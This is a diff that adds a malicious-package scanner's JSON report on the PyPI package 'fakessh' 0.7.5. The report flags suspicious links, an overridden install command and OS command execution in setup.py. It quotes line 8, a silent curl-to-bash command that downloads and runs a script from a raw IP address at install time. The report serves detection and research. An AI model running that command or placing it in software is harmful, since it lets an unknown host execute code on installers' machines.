@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "setup.py:8",
+                "code": "        os.system('curl -qs http://34.69.215.243/hi 2>/dev/null | bash 2>/dev/null >/dev/null')\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:11",
+                "code": "setup(\n    name=\"fakessh\",\n    version=\"0.7.5\",\n    author=\"Fakessh Demo\",\n    author_email=\"graphite@inbox.ru\",\n    description=\"Fakessh package that accepts all credentials\",\n    long_description=\"Fake SSH server that accepts all credenti...\n    ],\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": [
+            {
+                "location": "setup.py:8",
+                "code": "        os.system('curl -qs http://34.69.215.243/hi 2>/dev/null | bash 2>/dev/null >/dev/null')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/fakessh-0.7.5"
+}
